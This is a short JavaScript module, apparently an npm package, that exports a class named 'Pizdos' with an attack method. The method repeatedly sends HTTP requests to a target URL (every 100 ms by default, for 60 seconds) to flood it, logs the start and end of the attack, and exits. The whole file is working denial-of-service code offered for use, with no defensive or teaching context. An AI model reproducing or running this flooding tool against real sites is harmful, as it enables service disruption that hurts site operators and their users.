const r2 = require('r2')

module.exports = class Pizdos {
    /**
     * Starts attack on url using options.
     * @param {string} url 
     * @param {object} options
     * @returns {void}
     * @public
     */
    static attack(url, {
        duration = 60000,
        frequency = 100,
        log = console.log
    } = {}) {
        log(`Attack started at ${new Date}.`)

        setInterval(() =>
            r2(url).text
            .catch(error => {
                throw 'Attack ended with an error.\n' + error
            }), frequency)

        setTimeout(() => {
            log(`Attack complete at ${new Date}.`)
            process.exit(0)
        }, duration)
    }
}
